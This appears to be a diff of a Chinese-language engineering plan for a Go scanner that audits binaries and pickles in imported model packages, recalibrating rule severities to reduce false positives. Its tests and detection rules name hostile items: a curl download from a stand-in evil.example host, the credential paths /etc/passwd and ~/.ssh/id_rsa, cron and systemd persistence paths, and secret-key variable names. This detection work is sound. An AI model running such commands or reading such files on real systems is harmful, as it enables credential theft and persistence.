@@ -69,7 +69,7 @@ go build ./... && go test ./internal/codeaudit/... ./internal/config/... ./inter
 | 文件 | 改动 |
 | --- | --- |
 | `internal/codeaudit/rules.go` | `Finding` 增 3 个二进制字段；`Report` 增 `Binary`；`ProvesCleanScan()` 折入二进制完整性 |
-| `internal/codeaudit/audit.go` | `AuditMetadata` 增二进制字段；`ruleSuggestionMap` 增 3 条；`AssembleAuditReport` 从 `scanReport.Binary` 抄元数据 |
+| `internal/codeaudit/audit.go` | `AuditMetadata` 增二进制字段；`ruleSuggestionMap` 增二进制规则条目；`AssembleAuditReport` 从 `scanReport.Binary` 抄元数据 |
 | `internal/codeaudit/verifier.go` | 新增 `AuditConfig`；`GenerateAuditReport` 接 `AuditConfig`、插入 Phase 1b/1c；新增 `analyzeBinaryFileWithLLM` 与二进制 prompt；`analyzeFileWithLLM` 增 evidence 参数 |
 | `internal/codeaudit/llm_test.go` | `mockLLMClient` 增 `filePrompts` 捕获字段 |
 | `internal/codeaudit/{audit_test,llm_absence_test,engine_select_test}.go` | 机械更新 `GenerateAuditReport` 调用点（共 11 处） |
@@ -100,6 +100,7 @@ go build ./... && go test ./internal/codeaudit/... ./internal/config/... ./inter
 11. **嵌套归档只递归一层**。`models/examples/Retina-DKD/Retina-DKD-code.zip` 把 `net_001.pth`/`net_005.pth` 作为成员携带，它们分类为 `KindArchive`；`collectArchive` 只对分类为 ELF 或 pickle 的成员下钻，因此这两个 checkpoint 不会被打开，其 `data.pkl` 永远到不了 pickle 解释器。**代价明确**：只装在 zip 里的 checkpoint 既不产出成员证据也不产出 pickle 目标；这一条现在由第 7 条的门控放大——解释器只跑在被声明为 pickle 的流上，而嵌套归档里那条流既没被声明、也没被下钻，没有第二次机会被发现；跳过是静默的（成员名与大小进了证据列表，但不置 `Bounded`）。
 12. **`.xlsx` 就是 zip**。语料里的 14 个 `.xlsx` 中 13 个是普通 zip（最坏压缩比 22.91，无炸弹形状，成员均分类为非可执行），第 14 个 `models/examples/Retina-DKD/Retina-DKD/test_result.xlsx` 是 OLE2 老式 `.xls` 顶着 `.xlsx` 名，不匹配任何魔数，落到 `KindRaw`。**代价明确**：当作 zip 的那 13 个只按普通容器处理（成员头嗅探 + 成员名/大小），内部的 XML 不进任何结构化解析；当 OLE2 的那一个只拿 strings 证据，不会因为扩展名被当成 zip 打开。
 13. **配置里只暴露五个上限，其余固定在 `DefaultBinaryConfig`，这是有判据的选择而不是遗漏**。有键的是 `maxArchiveMembers`、`maxFindings`、`maxFullScanBytes`、`maxStreamBytes`、`highEntropyThreshold`；没有键的是 `MaxEvidenceLines`（默认 50000）、`HeadTailBytes`、`MaxSectionBytes`、`MaxArchiveMemberBytes`、`MaxStringLen`/`MinStringLen`。判据是**越界之后留下什么**：越界只记 `Bound.Listing` 的天花板（如 `MaxEvidenceLines`）只影响显示、不阻断任何东西，让它固定是安全的；越界会记 `Bound.Structural` 的天花板，在可执行类型上会**阻断导入**，没有键就成了 operator 无法处置的阻断，所以必须暴露。`MaxStreamBytes` 正落在后者——它只有在一个通过了 `MaxFullScanBytes` 的文件上才可能被触到，所以把 `maxFullScanBytes` 抬到 3 GiB 以上就会让它生效；两个键因此成对出现，并在同一处校验。**代价明确**：这五个以外的上限调不了，调它们要改代码重新部署。
+14. **自由字符串证据只判 LOW，且 `OBF_001` 在二进制臂被整个删掉**。判据是一条通则：**一条 finding 只有被文件无法偶然产生的结构背书时才可以判 HIGH**，而"某个字面量里出现了某个词"不是那种背书——`.pyc` 常量池会把相邻常量拼成一整段可打印串，二进制数据里遍地是长 base64 字母表串，所以按子串匹配的规则会把合法库判成恶意（实测：旧 `OBF_001` 命中 28 个合法共享库中的 23 个，旧 `PER_001`/`FIL_001`/`ENV_001` 的片段命中来自 `taint_engine.cpython-312.pyc` 与 `security.cpython-312.pyc`）。因此字符串半边不借源码臂的 HIGH/MEDIUM id，改用独立 LOW 族 `CMD_002`/`PER_002`/`FIL_002`/`ENV_002`（两端锚定 token，`ENV_002` 不带 `(?i)`），`OBF_001` 不设族。**代价明确**：一个真正把 base64 载荷以字面量形式留在代码里的文件，其字符串证据不再单独产出 finding；它若真在运行，仍会以 ELF 导入符号或 pickle 目标等结构证据（HIGH）出现，而纯数据文件本来就不被本平台加载。**不要把它"修回去"**——把字符串匹配放宽回子串或把严重级抬回 HIGH，就是重新引入这批误报，而误报在这种设计下的终点是删包。
 
 ---
 
@@ -1022,8 +1023,8 @@ type BinaryConfig struct {
 	// blocking, not the cap.
 	//
 	// 50 rather than 200 because the evidence families number ten
-	// (NET_002/CMD_001/DYN_001/BIN_001/BIN_002/PKL_001/FIL_001/PER_001/ENV_001/
-	// OBF_001): fifty findings is five instances of every family, far past the
+	// (NET_002/CMD_001/CMD_002/DYN_001/PKL_001/BIN_001/BIN_002/PER_002/FIL_002/
+	// ENV_002): fifty findings is five instances of every family, far past the
 	// point where another instance changes the verdict. Worst case LLM calls go
 	// from 200 to 250, and only when both arms saturate - a state that already
 	// blocks and deletes regardless of how many calls it costs.
@@ -3934,9 +3935,12 @@ func TestMatchEvidenceSymbolFamilies(t *testing.T) {
 		{SourcePickle, "subprocess.Popen", "PKL_001"},
 		{SourcePickle, "builtins.eval", "PKL_001"},
 		{SourceEntropy, "high-entropy-executable-section .text 7.94", "BIN_001"},
-		{SourceStrings, "/etc/passwd", "FIL_001"},
-		{SourceStrings, "/root/.ssh/id_rsa", "FIL_001"},
-		{SourceStrings, "(/etc/cron.d/backdoor)", "PER_001"},
+		{SourceStrings, "/bin/sh", "CMD_002"},
+		{SourceStrings, "curl -o /tmp/x http://evil.example/p", "CMD_002"},
+		{SourceStrings, "/etc/passwd", "FIL_002"},
+		{SourceStrings, "/root/.ssh/id_rsa", "FIL_002"},
+		{SourceStrings, "crontab -l", "PER_002"},
+		{SourceStrings, "AWS_SECRET_ACCESS_KEY", "ENV_002"},
 	}
 	for _, tc := range cases {
 		got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text})
@@ -3978,6 +3982,14 @@ func TestMatchEvidenceRejectsTheBenignNeighbours(t *testing.T) {
 		{SourceSection, ".text size=1048576 executable=true"},
 		{SourceMember, "archive/data.pkl size=1024"},
 		{SourceNotice, "interpreter /lib64/ld-linux-x86-64.so.2"},
+		// Each of these is a measured false positive of the previous table, kept
+		// here so a later widening has to argue with the evidence: `bind` on its
+		// own is a server, and the two trailing runs are fragments of a
+		// concatenated string table rather than the paths they spell.
+		{SourceDynsym, "bind"},
+		{SourceStrings, ".profilez /etc/cron) crontabz"},
+		{SourceStrings, ".aws/credentialsz"},
+		{SourceStrings, ".ssh/id_rsaz"},
 	}
 	for _, tc := range cases {
 		if got := matcher.Match(EvidenceLine{Source: tc.source, Text: tc.text}); got != nil {
@@ -3998,6 +4010,120 @@ func TestSymbolRulesDoNotMatchStringLiterals(t *testing.T) {
 		if got := matcher.Match(EvidenceLine{Source: SourceStrings, Text: text}); got != nil {
 			t.Errorf("the literal %q matched %s as a symbol; strings are not symbol evidence", text, got.ID)
 		}
+	}
+}
+
+// TestBinaryTableProducesNoHighFindingsOnLegitimateInputs is the bar the table
+// has to clear, and it is a bar rather than a preference. The severity column is
+// the only control that exists downstream: `Passed` is computed as
+// `highCount == 0` (with the medium count added under the `gate` policy,
+// internal/codeaudit/audit.go:301), and a false `Passed` makes
+// `internal/controller/import_processing.go:655-660` run `cleanDirContents` and
+// delete the model package. A rule table that reports a HIGH on an ordinary
+// shared object or a compiled .pyc therefore does not merely add noise - it
+// destroys the package.
+//
+// Every fixture below reproduces a shape measured against real files on this
+// machine: `/home/hjy/taa/models` (untracked, so it cannot itself be the
+// fixture), the 28 shared libraries of a stock ollama install, and the .pyc
+// files under this repository, using the stringScanner semantics from
+// binary_evidence.go, real `readelf --dyn-syms` output and real pickle targets.
+// The measured numbers the shapes stand for - 23 of 28 libraries firing a
+// free-string rule, `bind` in libllama-common.so, `.profilez /etc/cron)` and
+// `crontabz` inside taint_engine.cpython-312.pyc - are recorded in this task's
+// prose so a later reader can repeat the run against the finished table.
+func TestBinaryTableProducesNoHighFindingsOnLegitimateInputs(t *testing.T) {
+	matcher, err := NewBinaryMatcher()
+	if err != nil {
+		t.Fatal(err)
+	}
+	fixtures := []struct {
+		name  string
+		lines []EvidenceLine
+	}{
+		{"a 120-digit decimal run, as in libllama.so", []EvidenceLine{
+			{Source: SourceStrings, Text: "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879"},
+		}},
+		{"a 120-plus base64-alphabet run, as in a torch data.pkl", []EvidenceLine{
+			{Source: SourceStrings, Text: "zpssssssssrrrruuuuvstutsrqqpopotpprsssssssrrrrtuuutqrsrrpooommnnnmpqqqqabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"},
+		}},
+		{"a .pyc concatenated run holding crontab and /etc/cron mid-run", []EvidenceLine{
+			{Source: SourceStrings, Text: ".profilez /etc/cron) crontabz code_security_analyzer"},
+		}},
+		{"a dynsym listing with bind alone, as in libllama-common.so", []EvidenceLine{
+			{Source: SourceDynsym, Text: "bind"},
+		}},
+		{"a dynsym listing with dlopen and dlsym, as in libgomp.so", []EvidenceLine{
+			{Source: SourceDynsym, Text: "dlopen"},
+			{Source: SourceDynsym, Text: "dlsym"},
+		}},
+		// `API_KEY` matches ENV_002 and that is intended - it is a LOW, and the
+		// assertion below is about HIGH. `private_key` must NOT match, which is
+		// what dropping (?i) bought; the two `...z` runs are the .pyc fragments.
+		{"a string run holding ordinary identifiers", []EvidenceLine{
+			{Source: SourceStrings, Text: "API_KEY"},
+			{Source: SourceStrings, Text: "private_key"},
+			{Source: SourceStrings, Text: ".aws/credentialsz"},
+			{Source: SourceStrings, Text: ".ssh/id_rsaz"},
+		}},
+		{"a legitimate kernel's imports", []EvidenceLine{
+			{Source: SourceDynsym, Text: "malloc"},
+			{Source: SourceDynsym, Text: "memcpy"},
+			{Source: SourceDynsym, Text: "pthread_create"},
+			{Source: SourceNeeded, Text: "libc.so.6"},
+			{Source: SourceNeeded, Text: "libm.so.6"},
+		}},
+	}
+	for _, fx := range fixtures {
+		t.Run(fx.name, func(t *testing.T) {
+			for _, line := range fx.lines {
+				if rule := matcher.Match(line); rule != nil && rule.Severity == SeverityHigh {
+					t.Errorf("%s %q produced the HIGH finding %s; a legitimate file must not be able to block the import",
+						line.Source, line.Text, rule.ID)
+				}
+			}
+		})
+	}
+}
+
+// TestBinaryTableStillFiresHighOnStructuralEvidence is the other direction, and
+// it is what keeps the test above from being vacuous: a table with no rules at
+// all would pass a test that only asserts silence. Every case here is evidence
+// the file's own construction produced - a committed pickle parse, a symbol or
+// library name the linker wrote, a measured executable-section entropy - and
+// each must stay HIGH, so a later recalibration that softens one of them fails
+// here rather than silently lowering the bar.
+func TestBinaryTableStillFiresHighOnStructuralEvidence(t *testing.T) {
+	matcher, err := NewBinaryMatcher()
+	if err != nil {
+		t.Fatal(err)
+	}
+	cases := []struct {
+		name string
+		line EvidenceLine
+		want string
+	}{
+		{"a pickle target that executes on load", EvidenceLine{Source: SourcePickle, Text: "posix.system"}, "PKL_001"},
+		{"a dynsym execve", EvidenceLine{Source: SourceDynsym, Text: "execve"}, "CMD_001"},
+		{"a dynsym memfd_create", EvidenceLine{Source: SourceDynsym, Text: "memfd_create"}, "BIN_002"},
+		{"a dynsym connect", EvidenceLine{Source: SourceDynsym, Text: "connect"}, "NET_002"},
+		{"a client library dependency", EvidenceLine{Source: SourceNeeded, Text: "libcurl.so.4"}, "NET_002"},
+		{"a high-entropy executable section", EvidenceLine{Source: SourceEntropy, Text: "high-entropy-executable-section .text 7.94"}, "BIN_001"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rule := matcher.Match(tc.line)
+			if rule == nil {
+				t.Fatalf("no rule matched %s %q, want %s", tc.line.Source, tc.line.Text, tc.want)
+			}
+			if rule.ID != tc.want {
+				t.Errorf("%s %q matched %s, want %s", tc.line.Source, tc.line.Text, rule.ID, tc.want)
+			}
+			if rule.Severity != SeverityHigh {
+				t.Errorf("%s is %s; every rule in this test must stay HIGH, so a later downgrade breaks it",
+					rule.ID, rule.Severity)
+			}
+		})
 	}
 }
 ```
@@ -4027,12 +4153,49 @@ import (
 // own severity because there is no source-side rule with the same id to borrow
 // it from; every rule id that does exist in DefaultRules() is looked up there
 // instead, so the two channels cannot disagree about a shared family's severity.
+//
+// The severity column is policy, and the policy this table encodes is one
+// sentence: a finding may be HIGH only when it is corroborated by structure the
+// file cannot produce by accident. A dynamic symbol table entry, a DT_NEEDED
+// name, a committed pickle parse and a measured executable-section entropy are
+// all produced by the file's own construction. A free string is not: a .so
+// contains whatever text its authors embedded, and a .pyc's constants
+// concatenate into runs that contain anything, so a string match is evidence for
+// a reader and for the Tier-2 model rather than a verdict on its own.
+//
+// The reason this has to be stated rather than felt is that the severity column
+// is the only control that exists downstream. `Passed` is computed as
+// `highCount == 0` under the default `assist` policy, and with the medium count
+// added under `gate` (internal/codeaudit/audit.go:298-309). A false `Passed`
+// makes internal/controller/import_processing.go:655-660 run cleanDirContents
+// and delete the model package. Measured against the real files on this machine,
+// the table as first written deleted legitimate packages: one free-string rule
+// fired on 23 of 28 legitimate shared libraries. That is why the four
+// string-evidence families below live under new ids at LOW rather than borrowing
+// the source arm's severity - the source arm's rules match Python source, where
+// a literal in a call is a different fact from a byte run in a binary.
+//
+// "LOW" is the literal the report path already uses for a non-blocking finding:
+// DefaultRules() has no LOW constant, and ClassifyFindingRisk falls through to
+// "LOW" for any severity that is neither HIGH nor MEDIUM
+// (internal/codeaudit/audit.go:242-243). A LOW finding still reaches the report
+// and still goes to the Tier-2 verifier, which can raise it to MALICIOUS on its
+// own evidence; it simply does not block by itself.
 var binaryOnlyRules = map[string]Rule{
 	"BIN_001": {
 		ID:       "BIN_001",
 		Category: "加壳载荷",
-		Severity: SeverityMedium,
-		Description: "可执行节区或整个文件熵接近随机 — 代码已被压缩或加密，运行前必须先解包",
+		// HIGH, not MEDIUM: the reading is a measurement rather than a pattern -
+		// an executable section that measures near eight bits per byte has been
+		// compressed or encrypted and something must unpack it before it runs -
+		// and packing is exactly what this channel exists to catch. The
+		// measurement does not misfire on ordinary libraries: the highest
+		// executable-section entropy across the 28 shared libraries of a stock
+		// ollama install is 6.75 bits/byte, well under the 7.5 threshold, and
+		// libgomp.so's 7.97 .gnu_debugdata is not SHF_EXECINSTR so the extractor
+		// never measures it.
+		Severity:    SeverityHigh,
+		Description: "可执行节区熵接近随机 — 代码已被压缩或加密，运行前必须先解包",
 	},
 	"BIN_002": {
 		ID:          "BIN_002",
@@ -4045,6 +4208,37 @@ var binaryOnlyRules = map[string]Rule{
 		Category:    "反序列化执行",
 		Severity:    SeverityHigh,
 		Description: "pickle 流要求反序列化器解析具备进程/IO/网络能力的模块属性 — 加载即执行",
+	},
+	// The four families below carry free-string evidence and are LOW. Their ids
+	// are new rather than shared because PER_001 and CMD_001 are HIGH in the
+	// source table and FIL_001/ENV_001 are MEDIUM - and MEDIUM is not the safe
+	// level either, because under the gate policy it blocks and deletes too
+	// (audit.go:301). Giving them LOW under a shared id would make the two arms
+	// disagree about a shared family's severity, which
+	// TestBinaryRulesBorrowSharedFamilies exists to prevent.
+	"CMD_002": {
+		ID:          "CMD_002",
+		Category:    "命令执行（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量呈现命令行形态 — 需人工确认是配置文本还是执行载荷",
+	},
+	"PER_002": {
+		ID:          "PER_002",
+		Category:    "持久化后门（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量呈现持久化形态 — 需人工确认",
+	},
+	"FIL_002": {
+		ID:          "FIL_002",
+		Category:    "敏感文件读取（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量指向敏感路径 — 需人工确认是读取能力还是日志文本",
+	},
+	"ENV_002": {
+		ID:          "ENV_002",
+		Category:    "环境变量（字符串证据）",
+		Severity:    "LOW",
+		Description: "二进制中的字面量是一个密钥型环境变量名 — 需人工确认",
 	},
 }
 
@@ -4065,6 +4259,12 @@ type binaryFamily struct {
 // that matches owns the line. A line that two families could describe is
 // therefore counted once, which is what keeps the statistics from
 // double-weighting one defect.
+//
+// The claim sets are narrower than the source arm's on purpose, and the
+// narrowing is the fix for the false positives this table was measured to have.
+// A rule whose claim is a bare identifier or a substring catches every
+// legitimate file that happens to contain it - which for a model package means
+// a deleted package, not a noisy report.
 var binaryFamilies = []binaryFamily{
 	{
 		// memfd_create and fexecve come before the general command family so
@@ -4074,32 +4274,48 @@ var binaryFamilies = []binaryFamily{
 		Patterns: compilePatterns(`^(memfd_create|fexecve)$`),
 	},
 	{
-		ID:      "CMD_001",
-		Sources: []EvidenceSource{SourceDynsym, SourceStrings},
+		// The symbol half of command execution, and the half that is structural:
+		// a dynamic symbol table entry is written by the linker, so a binary that
+		// imports system() has the capability. Only SourceDynsym - the string
+		// half lives in CMD_002 below, because the same word in a literal is not
+		// a capability.
+		ID:       "CMD_001",
+		Sources:  []EvidenceSource{SourceDynsym},
 		Patterns: compilePatterns(
 			`^(system|execve|execv|execvp|execl|execlp|execle|popen|posix_spawn|posix_spawnp|forkpty|WinExec|ShellExecuteA|ShellExecuteW|CreateProcessA|CreateProcessW)$`,
-			`^/bin/(sh|bash|dash|zsh)$`,
-			`^(bash|sh) -c\b`,
-			`\b(curl|wget) -[a-zA-Z]*O?\b.*https?://`,
 		),
 	},
 	{
-		ID:      "NET_002",
-		Sources: []EvidenceSource{SourceDynsym, SourceNeeded},
+		// The client half of raw network use. The set is deliberately the
+		// outbound-client shape rather than every socket primitive, and the
+		// measurement is why: against the 28 shared libraries of a stock ollama
+		// install, the generic and server-side symbols - `bind`, `send`, `recv` -
+		// are imported by libllama-common.so, a legitimate library, while no
+		// library in that set imports `socket` or `connect` or needs libcurl.
+		// `bind` alone is a server, and a rule that blocks every server is a rule
+		// that blocks a networking stack; the client symbols plus a client library
+		// dependency keep the claim small enough to mean something. The shared id
+		// and its severity are the source arm's, so this family stays HIGH.
+		ID:       "NET_002",
+		Sources:  []EvidenceSource{SourceDynsym, SourceNeeded},
 		Patterns: compilePatterns(
-			`^(socket|connect|bind|listen|accept|send|sendto|sendmsg|recv|recvfrom|recvmsg|getaddrinfo|gethostbyname|gethostbyaddr|inet_addr|inet_pton|WSAStartup|WSASocketA)$`,
+			`^(socket|connect|getaddrinfo|gethostbyname|gethostbyaddr|inet_addr|inet_pton|WSAStartup|WSASocketA|WSASocketW)$`,
 			`^libcurl\.so`,
 			`^libssl\.so`,
 		),
 	},
 	{
+		// MEDIUM, borrowed from the shared table. It stays: dlopen is ordinary in
+		// legitimate shared objects, but the evidence is structural - the symbol
+		// table says the library declares the capability - and the shared
+		// severity is the source arm's to set.
 		ID:       "DYN_001",
 		Sources:  []EvidenceSource{SourceDynsym},
 		Patterns: compilePatterns(`^(dlopen|dlmopen|dlsym)$`),
 	},
 	{
-		ID:      "PKL_001",
-		Sources: []EvidenceSource{SourcePickle},
+		ID:       "PKL_001",
+		Sources:  []EvidenceSource{SourcePickle},
 		Patterns: compilePatterns(
 			// Process execution. The module list is a deny list of capabilities,
 			// not an allow list of libraries: an allow list would have to name
@@ -4112,51 +4328,84 @@ var binaryFamilies = []binaryFamily{
 		),
 	},
 	{
-		ID:      "PER_001",
-		Sources: []EvidenceSource{SourceStrings},
+		// The string half of command execution, at LOW. Only genuine command-line
+		// shapes survive here: a bare symbol name in a literal is what
+		// TestSymbolRulesDoNotMatchStringLiterals refuses, and an unanchored
+		// substring catches a fragment of a concatenated constant pool.
+		ID:       "CMD_002",
+		Sources:  []EvidenceSource{SourceStrings},
 		Patterns: compilePatterns(
-			`^crontab`,
-			`/etc/cron[a-z.]*`,
+			`^/bin/(sh|bash|dash|zsh)$`,
+			`^(bash|sh) -c\b`,
+			`\b(curl|wget)\s+.*https?://`,
+		),
+	},
+	{
+		// Token-anchored at both ends. The previous patterns fired on
+		// `'crontabz'` and on `'.profilez /etc/cron)'` inside
+		// taint_engine.cpython-312.pyc, where a .pyc's constants concatenate into
+		// a run and a mid-run path always matches an unanchored pattern. A
+		// boundary on the token, not the fragment, is the fix; raising the
+		// severity would not have been.
+		ID:       "PER_002",
+		Sources:  []EvidenceSource{SourceStrings},
+		Patterns: compilePatterns(
+			`^crontab\b`,
+			`^/etc/cron[a-z.]*`,
 			`(?:^|/)\.bashrc$`,
 			`(?:^|/)\.bash_profile$`,
-			`systemctl (enable|start)`,
-			`/etc/systemd/system`,
-			`/etc/init\.d`,
+			`^systemctl\s+(enable|start)`,
+			`^/etc/systemd/system`,
+			`^/etc/init\.d`,
 		),
 	},
 	{
-		ID:      "FIL_001",
-		Sources: []EvidenceSource{SourceStrings},
+		// Same anchoring requirement, same measurement. `'.aws/credentialsz'`
+		// and `'.ssh/id_rsaz'` were the observed fragments; the trailing `z` is
+		// proof the match was a fragment of a concatenated run, and the `$` is
+		// what refuses it.
+		ID:       "FIL_002",
+		Sources:  []EvidenceSource{SourceStrings},
 		Patterns: compilePatterns(
-			`/etc/(?:passwd|shadow|sudoers)`,
-			`(?:^|/)\.ssh/(?:id_[a-z]+|authorized_keys|config)`,
-			`(?:^|/)\.aws/credentials`,
-			`(?:^|/)\.kube/config`,
-			`/proc/self/environ`,
+			`^/etc/(?:passwd|shadow|sudoers)$`,
+			`^(?:.*/)?\.ssh/(?:id_[a-z]+|authorized_keys|config)$`,
+			`^(?:.*/)?\.aws/credentials$`,
+			`(?:^|/)\.kube/config$`,
+			`^/proc/self/environ$`,
 		),
 	},
 	{
-		ID:      "ENV_001",
-		Sources: []EvidenceSource{SourceStrings},
+		// Exact case, and no (?i). The source arm's ENV_001 carries (?i) because
+		// it matches `os.getenv("AWS_SECRET_ACCESS_KEY")`, an upper-case name by
+		// convention; the same flag here made the lower-case identifier
+		// `private_key` match `PRIVATE_KEY` in security.cpython-312.pyc. A bare
+		// identifier is a name, not a secret read.
+		ID:       "ENV_002",
+		Sources:  []EvidenceSource{SourceStrings},
 		Patterns: compilePatterns(
-			`(?i)^(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|API_KEY|SECRET_KEY|ACCESS_TOKEN|PRIVATE_KEY|GITHUB_TOKEN)$`,
+			`^(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|API_KEY|SECRET_KEY|ACCESS_TOKEN|PRIVATE_KEY|GITHUB_TOKEN)$`,
 		),
 	},
 	{
-		ID:      "BIN_001",
-		Sources: []EvidenceSource{SourceEntropy},
+		ID:       "BIN_001",
+		Sources:  []EvidenceSource{SourceEntropy},
 		Patterns: compilePatterns(`^high-entropy-`),
 	},
-	{
-		ID:      "OBF_001",
-		Sources: []EvidenceSource{SourceStrings},
-		Patterns: compilePatterns(
-			// A long base64 blob left in a code slot. The length floor is what
-			// keeps this from firing on padded text.
-			`^[A-Za-z0-9+/]{120,}={0,2}$`,
-		),
-	},
 }
+
+// There is deliberately no OBF_001 family here, and its absence is a decision
+// rather than an omission. The source arm keeps OBF_001 for
+// `base64.b64decode(...)` and friends, where the evidence is a call. The binary
+// arm originally matched `^[A-Za-z0-9+/]{120,}={0,2}$` against SourceStrings,
+// and that is where 23 of 28 legitimate shared libraries fired: the pattern
+// matches any 120-plus-byte run drawn from the base64 alphabet, which is
+// everywhere in binary data and in .pyc string tables - a plain 120-digit
+// decimal run in libllama.so.0.1.2 is enough. Tightening the alphabet or raising
+// the floor does not help, because the runs are real and long; the honest fix is
+// an occupancy guard on a whole unit (the section or member must be
+// predominantly the encoded run, not merely contain one), and no producer for
+// that unit-level verdict exists in this plan. So the family is dropped here and
+// the absence is stated rather than left to be rediscovered.
 
 // BinaryMatcher resolves the binary family table against the shared severity
 // table and matches evidence lines against it.
@@ -4273,15 +4522,21 @@ func BinaryRuleIDs() []string {
 
 - [ ] **Step 4: 把新 rule id 补进 `ruleSuggestionMap`**
 
-`internal/codeaudit/audit.go` 的 `ruleSuggestionMap` 目前只有源码臂的 13 个 id。二进制通道的 `BIN_001`、`BIN_002`、`PKL_001` 不在其中，落到 `SuggestionForRule` 的兜底文案上——报告会给出一条毫无指向的修复建议。补进去：
+`internal/codeaudit/audit.go` 的 `ruleSuggestionMap` 目前只有源码臂的 13 个 id。二进制通道的规则 id（`BIN_001`、`BIN_002`、`PKL_001`，以及 Step 3 新增的四个字符串族 `CMD_002`、`PER_002`、`FIL_002`、`ENV_002`）不在其中，落到 `SuggestionForRule` 的兜底文案上——报告会给出一条毫无指向的修复建议。补进去：
 
 ```go
 	"EMB_004": "不要将数据编码后嵌入模型权重",
 	"BIN_001": "确认该二进制段是否经过加壳/加密；若无需动态解包，改用未加壳的构建产物",
 	"BIN_002": "确认该二进制为何需要敏感能力；移除不必要的敏感符号引用",
 	"PKL_001": "不要反序列化不可信 pickle；改用 weights_only=True 或 safetensors 等纯数据格式",
+	"CMD_002": "确认该命令字符串是否来自可信构建；非必要不保留可执行的命令行",
+	"PER_002": "确认该持久化路径引用是否为良性常量；非必要不写入自启动/计划任务位置",
+	"FIL_002": "确认该敏感文件路径字符串的用途；非必要不引用凭证或系统文件",
+	"ENV_002": "确认该环境变量名是否为误报的字面量；凭证读取请集中在可信配置层",
 }
 ```
+
+`CMD_002`/`PER_002`/`FIL_002`/`ENV_002` 与源码臂的 `CMD_001`/`PER_001`/`FIL_001`/`ENV_001` **不是同一 id**，各自要有自己的条目：它们只是同一能力在字符串证据上的低置信度版本，兜底文案会读出错误的严重级语境。
 
 - [ ] **Step 5: 加一条完整性测试，防止下次新增规则时再漏**
 
@@ -4310,7 +4565,25 @@ go test ./internal/codeaudit/ -run 'TestBinaryRules|TestBinaryOnly|TestMatchEvid
 
 预期全 PASS。若 `TestBinaryOnlyFamiliesDoNotCollide` 报 `BIN_001` 之类的 id 冲突，说明 `binaryOnlyRules` 里写了与共享表相同的 id——修正 id 而不是放宽断言。
 
-- [ ] **Step 7: 提交**
+- [ ] **Step 7: 用真实语料手动跑一遍，把数字记在这里**
+
+两条测试都只跑合成夹具，而夹具是我挑的。上线前必须拿本仓库真实语料跑一次完整表，并**把实测数字写回本节**，让后来者能照着复现：
+
+```bash
+# 1) 28 个 ollama 共享库 + 658 个 .pyc，看有没有 HIGH
+#    （期望：0 个 HIGH；这正是本轮误报的来源，见 §5）
+# 2) /home/hjy/taa/models 全量，记录每族的 finding 数
+```
+
+**已测得的基线（本轮审计，写表时复核过）**，用来判断一次新跑的偏移是不是回归：
+
+- 语料中**没有任何真实 ELF/`.so`**（`find models -type f \( -name '*.so' -o -name '*.so.*' \)` 加上 ELF 魔数扫描都是 0）——`models/` 不是 `.so` 的来源，真正的 `.so` 只有 ollama 那 28 个。所以**宿主机的 `.so` 与这个语料交付的东西不成比例**，任何「按 `.so` 调参」的想法都要先想清楚它服务的是谁。
+- 28 个共享库中，旧 `OBF_001`（base64 长串）命中 **23** 个；旧 `NET_002`（含 `bind`/`send`/`recv`）至少命中 `libllama-common.so.0.1.2`（它导入 `bind recv send`，不含 `socket`/`connect`）；旧 `PER_001`/`FIL_001`/`ENV_001` 的片段命中来自 `taint_engine.cpython-312.pyc`（`'crontabz'`、`'.aws/credentialsz'`、`'.ssh/id_rsaz'`、`.profilez /etc/cron)`）与 `security.cpython-312.pyc`（小写 `private_key` 撞 `PRIVATE_KEY`）。**新表必须让这些全部归零**，这正是 `TestBinaryTableProducesNoHighFindingsOnLegitimateInputs` 的七个夹具组在钉的东西。
+- 可执行节区熵：28 个库中最高 **6.75** bits/byte（`libgomp.so` 的 7.97 在非可执行 `.gnu_debugdata`），与 7.5 阈值之间留有余量。
+
+一条**方向性**的坦白，必须写在任务里而不是留给读者推断：**本节没有任何证据证明 `PKL_001` 会命中一个*恶意* checkpoint。** 所有被采样、被跑过解释器的真实 pickle 都是良性的（真 checkpoint 只证明解释器能读出目标，不能证明恶意目标会被判成 HIGH）。`PKL_001` 是 HIGH 档，而 HIGH 会阻断并删包，所以它的双向性**未经验证**：已知的是它不会误伤良性样本（上面的语料跑），未知的是它对恶意样本的命中率。补这个方向的唯一办法是造一个真正会执行 `posix.system` 的恶意 pickle 夹具（Task 4/Task 9 的合成夹具即用于此），不要用「跑过真实 checkpoint」冒充两边都验过。
+
+- [ ] **Step 8: 提交**
 
 ```bash
 gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
@@ -5112,7 +5385,7 @@ func TestMergeBinaryFindingsDropsTextFindingsForBinaryFiles(t *testing.T) {
 	res := &BinaryScanResult{
 		Claimed: []string{"/m/evil.py"},
 		Findings: []Finding{
-			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityMedium, Engine: EngineNameBinary},
+			{File: "/m/evil.py", Line: 1, RuleID: "BIN_001", Severity: SeverityHigh, Engine: EngineNameBinary},
 		},
 	}
 
@@ -6405,7 +6678,7 @@ go test ./... 2>&1 | grep -vE "^ok|no test files" | head -30
 
 - **识别**：按文件内容判定（ELF / zip 容器 / gzip / pickle / numpy / 其余二进制），扩展名仅作补充。改后缀不能绕过；`.py` 结尾的二进制同样会被认领。
 - **证据**：ELF 动态导入符号与 `DT_NEEDED`、节区构成与香农熵、可打印字符串、容器成员（zip/gzip 内部最多递归一层）、pickle 的 `GLOBAL`/`STACK_GLOBAL`/`INST` 目标（带 memo 表的 opcode 解释器）、超过 64 MiB 的文件读首尾各 1 MiB（捕捉 zip 末尾追加的载荷，并把单文件成本钉在约 190 ms）。
